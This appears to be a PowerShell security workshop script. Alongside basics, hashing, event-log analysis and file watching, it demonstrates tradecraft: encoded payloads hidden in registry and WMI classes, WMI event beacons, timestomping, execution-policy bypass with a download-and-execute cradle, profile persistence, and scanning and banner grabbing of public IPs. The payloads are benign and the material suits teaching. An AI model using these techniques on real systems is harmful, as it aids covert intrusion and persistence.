# Enable Process Creation auditing
AUDITPOL /SET /SUBCATEGORY:"Process Creation" /SUCCESS:enable /FAILURE:enable

# Enable process creation commandline logging
Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit -name ProcessCreationIncludeCmdLine_Enabled -Value 1

gpupdate /force

# Test that process creation logging is taking place
AUDITPOL /GET /SUBCATEGORY:"Process Creation"

Start-Process Notepad

if(Get-EventLog -LogName Security -InstanceId 4688 -Newest 1){
    Write-Output "Process creation logging is enabled"
}
else{
    Write-Output "Process creation logging is NOT enabled"
}


function Primer{

Get-Help

Get-Help address

Get-Help Get-NetIPAddress

Get-Help Get-NetIPAddress -Examples

Get-Help Get-NetIPAddress -ShowWindow

Get-Help Get-NetIPAddress -Full

Get-Command

Get-PSProvider

Get-PSDrive

New-PSDrive -Name t -PSProvider FileSystem -Root "\\127.0.0.1\c$\users"

Get-ChildItem -Name "C:\"

Get-ChildItem -Name "C:\Windows\System32" -File

Get-ChildItem -Name "C:\Windows\System32" -Directory

Get-ChildItem -Name "HKLM:\"

Get-ChildItem -Name 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'

Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 

Write-Output "PowerShell" | Out-File "$env:USERPROFILE\desktop\myfile.txt"

Get-Content -Path "$env:USERPROFILE\desktop\myfile.txt"

Copy-Item -Path "$env:USERPROFILE\desktop\myfile.txt" "$env:USERPROFILE\desktop\myfile2.txt"

Write-Output "Monad" | Out-File "$env:USERPROFILE\desktop\myfile2.txt" -Append

Get-Content -Path "$env:USERPROFILE\desktop\myfile2.txt"

$num1 = 12

$num2 = "34"

$num1.GetType()

$num2.GetType()

$num1 + $num2

$num2 + $num1

"powershell, " * 5

"PowerShell" -eq "powershell"

"PowerShell" -ceq "powershell"

"Monad" -ne "powershell"

5 -eq 5

5 -gt 6

5 -lt 3

5 -ge 5

5 -le 5

1 -eq 1 -and 2 -eq 3
 
1 -eq 1 -or 2 -eq 3

1..10

$num
$num++
$num

$num += 5  # Same as $num = $num + 5

$num -= 3 # Same as $num = $num - 5
 
Get-Process

Get-Process | Get-Member

ps | Select-Object id, starttime, name, xyz -First 3

Get-Process | Select-Object * -First 1

Get-Process -IncludeUsername

(Get-Process).path

$process = Get-Process

$process.Name
(get-process).Name

Start-Process -FilePath "regedit"
(get-process -Name "regedit").kill()

Start-Process -FilePath "nslookup"
Get-Process -Name "nslookup" | Stop-Process


#
$day = "monday"
If((get-date).dayofweek -eq $day){
    Write-host "Today is $day"
}
Else{
    Write-Output "Today is not Monday"
}

# 
$now = Get-Date
if ($now.DayOfWeek -eq 'Monday' -AND $now.hour -gt 12){
    Write-Output "The first day of the week is almost over!"
}


Get-CimInstance -Namespace root/cimv2 -ClassName win32_operatingsystem | format-list *

# 
$os = (Get-CimInstance -Namespace root/cimv2 -ClassName win32_operatingsystem).caption

if ($os -match "7"){
    Write-Output "Likely Windows 7"
}
elseif($os -match "8"){
    Write-Output "Likely Windows 8"
}
elseif($os -match "10"){
    Write-Output "Likely Windows 10"
}
else{
    Write-Output "Unknown operating system"
}


#
$services = get-service
 
ForEach ($thing in $services){
	$thing.name + " : " + $thing.status
}
Write-Output "`nThe last service is $($thing.name)" 
    

#
$question = "Are we there yet?"
$answer = "Noooooo!"
for ($i = 3; $i -gt 0; $i--){
    $question
    sleep 2
}

Write-Output "`n$answer"


# 
$food = 'Beans', 'Greens', 'Potatoes', 'Lamb', 'Rams', 'Hogs', 'Dogs'

for ($i = 5; $i -gt 0; $i--)
{
    foreach($item in $food){
        Write-Output "I got $item "
    }
}

Write-Output "`nYou name it!"


#
while ($true){
    test-connection 127.0.0.1
}


# Each iteration will multiply the number of rabbits by two
$rabbits = 2
Do{
    Write-output "We now have $rabbits rabbits!"
    $rabbits *= 2
}
While ($rabbits -lt 10000)


# 
$i = 0
while($i -lt 999){
    $i++
    $i
}
Write-Host "`nCount complete - We have counted up to $i" -ForegroundColor Cyan


#
try{
    Get-HotFix -ComputerName server01 -ErrorAction stop
    #Get-hotfix -ErrorAction stop
}
catch{
    Write-Host -ForegroundColor red "An error occurred"
}
finally{
    Write-Host "Attempted to get Hotfixes at $(get-date)"
}

} # Primer


Function Hashing{

Get-FileHash C:\Windows\write.exe

Get-ChildItem C:\Windows\system32\drivers | Get-FileHash

Get-FileHash C:\Windows\system32\drivers\*

# 
Get-Process | Get-Member

Get-process | Select-Object * -First 1

Get-process | Select -ExpandProperty modules -First 1 

Get-process | Select name -ExpandProperty modules -First 1 | Format-List

$p = Get-Process
$p.path
(get-process).path

$processes = Get-Process
foreach ($proc in $processes){
    try{
        Get-FileHash $proc.path -Algorithm SHA1 -ErrorAction stop
    }
    catch{
        $proc.name | out-file c:\proc_hash_error.log -Append
    }
}


# Finding duplicate hashes
Copy-Item C:\Windows\write.exe C:\Windows\w.exe

$baselineHashes = Get-ChildItem C:\windows| Get-FileHash -Algorithm md5 -ErrorAction SilentlyContinue
$uniq_BaselineHashes = $baselineHashes.hash | Select-Object -Unique

$diffHashes =(Compare-object –referenceobject $uniq_BaselineHashes –differenceobject $baselineHashes.hash).inputobject

foreach($hash in $baselineHashes){
    foreach($diff in $diffHashes){
        if($hash.hash -eq $diff){
            $hash
        }
    }
}

# Cleanup
Remove-Item C:\Windows\w.exe
Remove-Item C:\proc_hash_error.log


} # Hashing


Function Data_Storage{

#
Invoke-WebRequest -Uri "https://en.wikiversity.org/wiki/PowerShell"
Invoke-WebRequest -Uri "https://en.wikiversity.org/wiki/PowerShell" | Get-Member
(Invoke-WebRequest -Uri "https://en.wikiversity.org/wiki/PowerShell").links.href
((Invoke-WebRequest -Uri "https://en.wikiversity.org/wiki/PowerShell").links.href).count
((Invoke-WebRequest -uri "https://en.wikiversity.org/wiki/PowerShell").images.src).count
(Invoke-WebRequest -Uri "https://en.wikiversity.org/wiki/PowerShell").images.src

Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/PowerShell_5.0_icon.png/64px-PowerShell_5.0_icon.png" -OutFile "$env:USERPROFILE\desktop\ps.jpg"
Invoke-Item -path "$env:USERPROFILE\desktop\ps.jpg"

# Registry string store
[System.Text.Encoding] | get-member -Static
[System.Text.Encoding]::Unicode | get-member

[System.Convert] | get-member -Static

$Data2Encode = ‘PowerShell is Great!’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data2Encode)
$EncodedText =[System.Convert]::ToBase64String($Bytes)
$EncodedText
New-ItemProperty -path HKLM:\Software -Name "updater32" -Value $EncodedText -PropertyType multistring

Get-ItemProperty -path HKLM:\Software

# Registry string retrieval
$Data2Decode = (Get-ItemProperty HKLM:\software).updater32
$bytes = [System.Convert]::FromBase64String($Data2Decode)
$DecodedText = [System.Text.Encoding]::Unicode.GetString($bytes)
$DecodedText

# Registry Stager Store
$command = 'Start-BitsTransfer -Source "http://www.funnycatpix.com/_pics/Playing_A_Game.jpg" -Destination "$env:USERPROFILE\desktop\cat.jpg"' 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$EncodedCommand
New-ItemProperty -path HKLM:\software -Name "updater15" -Value $encodedCommand -PropertyType multistring

# Registry Stager Retrieval
$cmd = Get-ItemPropertyValue HKLM:\SOFTWARE -Name "updater15"
powershell.exe -noprofile -encodedCommand $cmd
Invoke-Item -Path $env:USERPROFILE\desktop\cat.jpg

# Registry binary store
$bytes = get-content C:\WINDOWS\system32\calc.exe -Encoding Byte
$EncodedText =[System.Convert]::ToBase64String($Bytes)
$EncodedText
New-ItemProperty -path HKLM:\software -Name "updater64" -Value $EncodedText -PropertyType multistring

# Registry binary retrieval
$Data2Decode = (Get-ItemProperty HKLM:\software).updater64
$bytes = [System.Convert]::FromBase64String($Data2Decode)
$bytes | Set-Content ("$Env:USERPROFILE\desktop\calc.exe") -Encoding Byte
& ("$Env:USERPROFILE\desktop\calc.exe")

# Registry string store
$Data2Encode = ‘PowerShell is Great!’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data2Encode)
$EncodedText =[System.Convert]::ToBase64String($Bytes)
$EncodedText
New-ItemProperty -path HKLM:\Software -Name "AppCache" -Value $EncodedText

New-ItemProperty -Path HKLM:\SOFTWARE -Name "AppCache32" -Value (" ".PadLeft(250) + $EncodedText)
New-ItemProperty -Path HKLM:\SOFTWARE -Name "AppCache64" -Value ('(value not set)' + " ".PadLeft(250) + $EncodedText)

# Registry string retrieval
[string]$item = (Get-ItemProperty -Path HKLM:\SOFTWARE).AppCache64
$Data2Decode = $item.Trim('(value not set)')
$bytes = [System.Convert]::FromBase64String($Data2Decode)
$DecodedText = [System.Text.Encoding]::Unicode.GetString($bytes)
$DecodedText

# Cleanup
Remove-ItemProperty HKLM:\SOFTWARE -Name "updater32"
Remove-ItemProperty HKLM:\SOFTWARE -Name "updater15"
Remove-ItemProperty HKLM:\SOFTWARE -Name "updater64"
Remove-ItemProperty HKLM:\SOFTWARE -Name "appcache"
Remove-ItemProperty HKLM:\SOFTWARE -Name "appcache32"
Remove-ItemProperty HKLM:\SOFTWARE -Name "appcache64"
Remove-Item "$env:USERPROFILE\desktop\ps.jpg"
Remove-item "$env:USERPROFILE\desktop\calc.exe"
Remove-item "$env:USERPROFILE\desktop\cat.jpg"


} # Data_Storage


function WMI_Classes{

Get-WmiObject -Namespace root/cimv2 -List | sort-object
Get-CimClass -Namespace root/cimv2 | Sort-Object

Get-WmiObject –Namespace root –List -Recurse | Measure-Object

Get-CimInstance -Namespace root/cimv2 -Classname win32_ntlogevent -filter "logfile='security'"
Get-CimInstance -Namespace root/cimv2 -Classname win32_startupcommand
Get-CimInstance -Namespace root/cimv2 -Classname win32_quickfixengineering
Get-CimInstance -Namespace root/cimv2 -ClassName Win32_service
(Get-CimInstance -Namespace root/cimv2 -ClassName win32_operatingsystem).OSArchitecture

$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null, $null)
$StaticClass.Name = 'Win33_Secret'
$StaticClass.Put()

$StaticClass.Properties.Add('MyProperty' , "This is just a test to see if data can be stored")
$StaticClass.Put()

$StaticClass | Select-Object -ExpandProperty properties
($StaticClass | Select-Object -ExpandProperty properties).value

$Data2Encode = "get-date | out-file $env:USERPROFILE\desktop\wmi_date.txt"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data2Encode)
$EncodedText =[System.Convert]::ToBase64String($Bytes)
$EncodedText

$StaticClass.Properties.Add('MyCode' , "$EncodedText")
$StaticClass.Put()

$StaticClass | Select-Object -ExpandProperty properties
($StaticClass | Select-Object -ExpandProperty properties).value

powershell -encodedcommand (($StaticClass | Select-Object -ExpandProperty properties | Where-Object{$_.name -eq "mycode"}).value)
powershell -encodedcommand (($StaticClass).Properties['mycode'].value)

Get-Content "$env:USERPROFILE\desktop\wmi_date.txt"

(Get-CimClass -Namespace root/cimv2 -ClassName win33_secret).CimClassProperties['mycode'].value
(Get-WmiObject -Namespace root/cimv2 -ClassName win33_secret -list).properties['myproperty'].value
(Get-CimClass -Namespace root/cimv2 -ClassName win33_secret | Select-Object -ExpandProperty cimclassproperties | Where-Object{$_.name -eq "mycode"}).value
(Get-WmiObject -Namespace root/cimv2 -ClassName win33_secret -list | Select-Object -ExpandProperty properties | Where-Object{$_.name -eq "mycode"}).value

powershell -encodedcommand ((Get-CimClass -Namespace root/cimv2 -ClassName win33_secret).CimClassProperties['mycode'].value)
powershell -encodedcommand ((Get-WmiObject -Namespace root/cimv2 -ClassName win33_secret -list | Select-Object -ExpandProperty properties | Where-Object{$_.name -eq "mycode"}).value)

Get-Content "$env:USERPROFILE\desktop\wmi_date.txt"


# Cleanup
$StaticClass.Delete()
$StaticClass.Dispose()
Remove-Item "$env:USERPROFILE\desktop\wmi_date.txt"


} # WMI_Classes


function WMI_Subscription{

function server($port){
    $Tcplistener = New-object System.Net.Sockets.TcpListener $port
    $Tcplistener.Start()
    Write-host "[-] " -ForegroundColor green -NoNewline; Write-Host "Listening: 0.0.0.0:$port" -ForegroundColor cyan
    $TcpClient = $Tcplistener.AcceptTcpClient()
    $remoteclient = $TcpClient.Client.RemoteEndPoint.Address.IPAddressToString
    Write-Host "[-] " -ForegroundColor green -NoNewline; Write-Host "New connection: $remoteclient" -ForegroundColor Cyan

    $TcpNetworkstream = $TCPClient.GetStream()
    $Receivebuffer = New-Object Byte[] $TcpClient.ReceiveBufferSize
    $encodingtype = New-Object System.Text.ASCIIEncoding
    while ($TCPClient.Connected){
        $Read = $TcpNetworkstream.Read($Receivebuffer, 0, $Receivebuffer.Length)          
            [Array]$Bytesreceived += $Receivebuffer[0..($Read -1)]
            [Array]::Clear($Receivebuffer, 0, $Read)

            $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($Bytesreceived))
            $ScriptBlock
            $TcpNetworkstream.Dispose(); $Tcpclient.Dispose(), $Tcplistener.Stop()
    }
}
server -port 6602

# Temp WMI... dies when the process terminates

Get-Process -Name notepad  -ErrorAction SilentlyContinue | Stop-Process

Register-CimIndicationEvent -Query "Select * from __InstanceCreationEvent within 15 where targetInstance isa 'win32_process' and (targetinstance.name = 'notepad.exe' OR targetinstance.name = 'wordpad.exe')" `
    -SourceIdentifier "trigger" -Action{Write-Output "$(get-date) - Temp WMI Register Executed Successfully" | Out-File $env:USERPROFILE\Desktop\logger.txt -Append}

Start-Process notepad
Get-Content "$env:USERPROFILE\Desktop\logger.txt"
Get-EventSubscriber
Unregister-Event -SourceIdentifier "trigger"

Register-CimIndicationEvent -Query "Select * from __instanceModificationEvent within 15 where targetInstance isa 'win32_Service'" `
    -SourceIdentifier "trigger2" -Action{Write-Output "$(get-date) - Temp WMI Register Executed Successfully" | Out-File $env:USERPROFILE\Desktop\logger2.txt -Append}

Restart-Service -Name BITS
Get-Content "$env:USERPROFILE\Desktop\logger2.txt"
Unregister-Event -SourceIdentifier "trigger2"

Register-WmiEvent -Query "Select * from __InstanceoperationEvent within 20 where targetinstance ISA 'win32_process' AND targetinstance.name='lsass.exe'" -SourceIdentifier "beacon" `
    -Action{
        $socket = new-object System.Net.Sockets.TcpClient("127.0.0.1", "6602")
        $data = [System.Text.Encoding]::ASCII.GetBytes("This is a test")
        $stream = $socket.GetStream()
        $stream.Write($data, 0, $data.Length)
    }

Unregister-Event -SourceIdentifier "beacon"


Get-WmiObject -Namespace root/cimv2 -Class win32_localtime

Register-WmiEvent -Query "Select * from __InstanceModificationEvent within 30 WHERE TargetInstance ISA 'Win32_LocalTime' AND targetinstance.hour = 20 AND targetinstance.minute = 42 group within 30" -SourceIdentifier "beacon2" `
    -Action{
        $socket = new-object System.Net.Sockets.TcpClient("127.0.0.1", "6602")
        $data = [System.Text.Encoding]::ASCII.GetBytes("This is a test")
        $stream = $socket.GetStream()
        $stream.Write($data, 0, $data.Length)
    }

Unregister-Event -SourceIdentifier "beacon2"

Get-Job

# Cleanup
Get-Job | Remove-Job
Remove-item $env:USERPROFILE\Desktop\logger.txt
Remove-item $env:USERPROFILE\Desktop\logger2.txt
Get-Process -Name notepad | Stop-Process


} # WMI_Subscription


Function Eventlogs{

# Get-Eventlog
Get-EventLog -LogName Security -InstanceId 4688
Get-EventLog -LogName Security -InstanceId 4688 | Select-Object * -first 1

#
Get-EventLog -LogName Security -InstanceId 4688 | Select-Object * -first 1 -ExpandProperty replacementstrings

#
Get-EventLog -LogName Security -InstanceId 4688 | Select-Object Timegenerated, @{Label='Process';expression={$_.ReplacementStrings[5]}} -first 1
 
# 
Get-WinEvent -FilterHashtable @{logname='security';id='4688'} 
Get-WinEvent -FilterHashtable @{logname='security';id='4688'} | Select-Object * -First 1

# 
Get-WinEvent -FilterHashtable @{logname='security';id='4688'} | Select-Object properties -expandproperty properties -first 1 | Format-List 

# 
$logs = Get-WinEvent -FilterHashtable @{logname='security';id='4688'} | Select-Object * -First 1 
@($logs.Properties[0..($logs.Properties.count)])

#
Get-WinEvent -FilterHashtable @{logname='security';id='4688'} | Select-Object timecreated, @{Label="Process";Expression={$_.properties.value[5]}}

# 
Get-WinEvent -FilterHashtable @{logname='security';id='4688'} | 
    Select-Object timecreated, @{Label="Account";Expression={$_.properties.value[1]}}, @{Label="Commandline";Expression={$_.properties.value[8]}}, @{Label="ParentProcess";Expression={$_.properties.value[13]}} -first 1 | 
    Format-List


# Create a custom log source
New-EventLog -logname application -Source "Processes"


# Create a custom log source that already exists
New-EventLog -LogName application -Source "MsiInstaller"


# Write to the eventlog
Write-EventLog -LogName application -Source "Processes" -entrytype Information -eventid 1337 -Message "Feed me data!!"

Get-EventLog -LogName Application -Source "Processes" -InstanceId 1337 -Newest 1 | format-list

[int]$num = 1
while($true){
    $num++
    $num
} 


foreach($myProc in (get-process).name){
    "workshop  " + $myProc
}


while($true){
    $date = get-date 
    $date
    Start-Sleep -Seconds 10
    $procs = get-process -IncludeUserName

    foreach($proc in $procs){
        if (($date) -lt $proc.StartTime){
            [string]$procStart = $proc.StartTime
            $procName = $proc.name
            $procPath = $proc.path
            $procID = ($proc.id).ToString()
            $procSId = ($proc.SessionId).ToString()
            $procUser =$proc.UserName
            Write-EventLog -LogName application -Source "Processes" -entrytype Information -eventid 1337 -Message "StartTime: $procStart`nName: $procName`nPath: $procPath`nID: $procid`nSessionID: $procSId`nUserName: $procUser"
        }
    }
}

Get-EventLog -LogName Application -Source "Processes" -InstanceId 1337 -Newest 1 | format-list


# Create a new eventlog
Get-EventLog -LogName "workshop"
New-EventLog -LogName "workshop" -Source "Star-lord"
Write-EventLog -LogName "workshop" -Source "Star-lord" -entrytype Information -eventid 7331 -Message "Peter Quill in the flesh!"

Get-EventLog -LogName workshop -InstanceId 7331 -Newest 1 | format-list

# Cleanup
Remove-EventLog -Source "Processes"
Remove-EventLog -LogName "workshop"


} # Eventlogs


function Timestomp{

$file = "$env:USERPROFILE\desktop\myfile.txt"

Get-Item $file | format-list *time

(Get-Item -path $file).LastWriteTimeutc = Get-Date

(Get-Item -path $file).LastWriteTime = (Get-Date).AddDays(-270)

(Get-Item -path $file).CreationTime = "8/8/2018 09:00:00 PM"

# Cleanup
Remove-Item "$env:USERPROFILE\desktop\myfile.txt"
Remove-Item "$env:USERPROFILE\desktop\myfile2.txt"


} # Timestomp


function Item-Watcher{

function watcher{
New-Item -ItemType Directory -Path $env:USERPROFILE\desktop\Item_Watcher
$PathToMonitor = "$env:USERPROFILE\desktop\Item_Watcher"

$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = $PathToMonitor
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

$Action = {
    $details = $event.SourceEventArgs
    $Name = $details.Name
    $FullPath = $details.FullPath
    $OldFullPath = $details.OldFullPath
    $OldName = $details.OldName
    $ChangeType = $details.ChangeType
    $Timestamp = $event.TimeGenerated
    
    switch ($ChangeType){
        'Changed' { Write-Host " `n[-] " -ForegroundColor cyan -NoNewline; write-host "$fullPath was CHANGED at $timestamp"}
        'Created' { Write-Host " `n[-] " -ForegroundColor cyan -NoNewline; write-host "$fullPath was CREATED at $timestamp"}
        'Deleted' { Write-Host " `n[-] " -ForegroundColor cyan -NoNewline; write-host "$fullPath was DELETED at $timestamp"}
        'Renamed' { Write-Host " `n[-] " -ForegroundColor cyan -NoNewline; write-host "$oldFullPath was RENAMED to $fullpath"}
    }
}

$reg = Register-ObjectEvent -InputObject $watcher -EventName Changed -Action $Action -SourceIdentifier Watcher-Change
$reg = Register-ObjectEvent -InputObject $watcher -EventName Created -Action $Action -SourceIdentifier Watcher-Create
$reg = Register-ObjectEvent -InputObject $watcher -EventName Deleted -Action $Action -SourceIdentifier Watcher-Delete
$reg = Register-ObjectEvent -InputObject $watcher -EventName Renamed -Action $Action -SourceIdentifier Watcher-Rename

Write-Host "Watching for changes to $PathToMonitor"

do{
    # do nothing 
} while ($true)

}
watcher


# cleanup
Unregister-Event -SourceIdentifier Watcher-Change
Unregister-Event -SourceIdentifier Watcher-Create
Unregister-Event -SourceIdentifier Watcher-Delete
Unregister-Event -SourceIdentifier Watcher-Rename
Get-Job -Name watcher* | Remove-Job
$watcher.EnableRaisingEvents = $false
$watcher.Dispose()
Remove-Item -Path $env:USERPROFILE\desktop\Item_Watcher -Force -Recurse


} # Item-Watcher


Function WinRM{

# 
Enable-PSRemoting -Force -SkipNetworkProfileCheck

# 
Enter-PSSession 127.0.0.1

Get-WSManInstance -ConnectionURI ('http://localhost:5985/wsman') -ResourceURI shell -enumerate

Get-WSManInstance -ConnectionURI ('http://localhost:5985/wsman') -ResourceURI shell -enumerate | select Owner, ClientIP, ProcessID, Locale, ShellRunTime, ShellinActivity | Format-Table


#cleanup
Disable-PSRemoting -Force
Remove-Item -Path WSMan:\Localhost\listener\listener* -Recurse
Stop-Service -Name WinRM -PassThru
Set-NetFirewallRule -DisplayName 'Windows Remote Management (HTTP-In)' -Enabled False -PassThru | Select -Property DisplayName, Profile, Enabled
Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system -Name LocalAccountTokenFilterPolicy -Value 0 -PassThru


} # WinRM


Function Port_Scanning{

Get-NetTCPConnection

Get-NetTCPConnection | Get-Member

$443 = New-Object system.net.sockets.tcplistener 443
$443.Start()
$23 = [system.net.sockets.tcplistener]::Create(23)
$23.start()

Get-NetTCPConnection -LocalPort 443, 23

# 
Test-NetConnection | Get-Member

# 
Test-NetConnection -ComputerName 127.0.0.1 -Port 443

# 
Test-NetConnection -ComputerName 127.0.0.1 -Port 800

# Adding suppression
Test-NetConnection -ComputerName 127.0.0.1 -Port 800 -WarningAction SilentlyContinue

# Fields we care about
Test-NetConnection -ComputerName 127.0.0.1 -Port 23 | select-object RemoteAddress, RemotePort, TcpTestSucceeded

# More than one port
$ports = 22,23,53,80,443
foreach($port in $ports){
    Test-NetConnection -ComputerName 127.0.0.1 -Port $port | select-object RemoteAddress, RemotePort, TcpTestSucceeded
}

# With suppression
$ports = 22,23,53,80,443
foreach($port in $ports){
    Test-NetConnection -ComputerName 127.0.0.1 -Port $port -WarningAction SilentlyContinue| select-object RemoteAddress, RemotePort, TcpTestSucceeded, PingSucceeded
}

# Single system and port
new-object Net.Sockets.TcpClient('8.8.8.8', '53')
new-object Net.Sockets.TcpClient('127.0.0.1', '443')
new-object Net.Sockets.TcpClient('127.0.0.1', '80')

# Net.Sockets.TCPClient
$ports = 22, 23, 80, 443
$IP = "127.0.0.1"
$scan = foreach($port in $ports){
    try{
        $portStatus = new-object Net.Sockets.TcpClient($IP, $port)
        [pscustomobject]@{
            RemoteAddress = $IP
            RemotePort = $port
            TcpTestSucceeded =  $portStatus.connected
        }
        $portStatus.Close()
    }
    catch{
        [pscustomobject]@{
            RemoteAddress = $IP
            RemotePort = $port
            TcpTestSucceeded = 'False'
        }
    }
}
$scan

                                                                                                                                                     
} # Port_Scanning


function Ping_Banner{

#
$sys = "127.0.0.1", "8.8.8.8", "176.9.9.172"

foreach($system in $sys){
    if(Test-Connection -count 1 -ComputerName $system -quiet){
        $system    
    }    
}


# 
$ips = 1..5 | ForEach-Object{"172.16.155.$_"}
foreach($ip in $ips){
    "$ip : $(test-Connection -Count 1 -ComputerName $ip -Quiet)"    
}


# Range to object
$ips = 1..5 | ForEach-Object{"172.16.155.$_"}
$results = @{}
$results = foreach($ip in $ips){
    $ttl = (test-Connection -Count 1 -ComputerName $ip -ErrorAction SilentlyContinue).responsetimetolive
    if($ttl -eq $null){
        $online = "false"
    }
    else{
        $online = "true"
    }
    [pscustomobject]@{
        IP = $ip
        Online = $online
    }
}
$results


# 
$ips = 1..255 | ForEach-Object{"172.16.155.$_"}
$out = $ips|ForEach-Object{(New-Object Net.NetworkInformation.Ping).SendPingAsync($_,800)}
[Threading.Tasks.Task]::WaitAll($out)
$out.Result | Where-Object{$_.Status -ne "timedout"} | Select-Object address


# Banner grab
$ips = "176.9.9.172", "23.83.193.164"
$ports =  @(22, 21, 80)
$results=@{}

function banner ($sys, $port){   
    $socket = New-Object System.Net.Sockets.TCPClient
    $connected = ($socket.BeginConnect($sys, $Port, $Null, $Null)).AsyncWaitHandle.WaitOne(600)
    if ($connected -eq "$True"){
        $stream = $socket.getStream() 
        Start-Sleep -Milliseconds 1000
        $text = ""
        while ($stream.DataAvailable){ 
            $text += [char]$stream.ReadByte()
        }
        if ($text.Length -eq 0){ 
            $text = $null
        }
        $script:banner = "$text"
        $socket.Close()
    } 
    else{ }
}

$out = $ips|ForEach-Object{(New-Object Net.NetworkInformation.Ping).SendPingAsync($_,500)}
[Threading.Tasks.Task]::WaitAll($out)
$system = $out.Result

$results = foreach($sys in $system){        
    
    if($sys.status -eq 'success'){
        $online = "True"
    }
    else{
        $online = "False"
    }                                        
    foreach ($port in $ports) {     
        try {
            $TestPort = banner $sys.address.ipaddresstostring $port
        } catch { }  
        try{
            $portStatus = new-object Net.Sockets.TcpClient($sys.address.ipaddresstostring, $port)   
            $portStatus = 'True'
        }
        catch{
            $portStatus = 'False'
        }      
        [pscustomobject]@{
            IP = $sys.address.ipaddresstostring
            Online = $online
            Port = $port
            Listening = $portStatus
            Banner = $banner
        }
        $banner = $null
    }
}
$results | format-table


# Cleanup
$443.Stop()
$23.stop()

Get-NetTCPConnection -LocalPort 443, 23


} # Ping_Banner


function Execution_Policy{

Get-ExecutionPolicy
Set-ExecutionPolicy -ExecutionPolicy Restricted

& "$env:USERPROFILE\desktop\demo_script.ps1"

Get-Content $env:USERPROFILE\desktop\demo_script.ps1 | powershell

$data = Get-Content $env:USERPROFILE\desktop\demo_script.ps1 
Write-Output $data | powershell

powershell -executionpolicy bypass -file $env:USERPROFILE\desktop\demo_script.ps1

powershell -command "invoke-expression (new-object net.webclient).downloadstring('http://localhost:4444/demo_script.ps1')"


$Data2Encode = get-content "$env:USERPROFILE\desktop\demo_script.ps1"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data2Encode)
$EncodedText =[System.Convert]::ToBase64String($Bytes)
$EncodedText

powershell -encodedcommand $EncodedText

Set-ExecutionPolicy -ExecutionPolicy Unrestricted


} # Execution_Policy


Function Profiles{

#
Get-PSDrive

Get-ChildItem variable:\
Get-ChildItem function:\

Get-ChildItem function:\wp

function wp{
    & "C:\Program Files (x86)\windows nt\accessories\wordpad.exe"
}

Get-ChildItem function:\wp

Get-Content function:\wp
Get-ChildItem function:\wp | Select-Object -ExpandProperty scriptblock

# 
$profile
$profile |Format-List * -force

# 
Test-Path $profile

# Create profile
if(-not(test-path $profile)){new-item -Path $profile -force}

#
Write-Output "function notepad{c:\windows\notepad.exe; c:\windows\system32\calc.exe}" | out-file $profile

# Cleanup
Set-Content -Path $profile -Value (get-content -Path $profile | Select-String -Pattern 'function notepad' -NotMatch)
Get-Job | Stop-Job
Remove-Item "$env:USERPROFILE\desktop\downloaded_script.ps1"
Remove-Item "$env:USERPROFILE\desktop\demo_script.ps1"

} # Profiles


# Disable Process Creation auditing
AUDITPOL /SET /SUBCATEGORY:"Process Creation" /SUCCESS:disable /FAILURE:disable

# Disable process creation commandline logging
Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit -name ProcessCreationIncludeCmdLine_Enabled -Value 0

gpupdate /force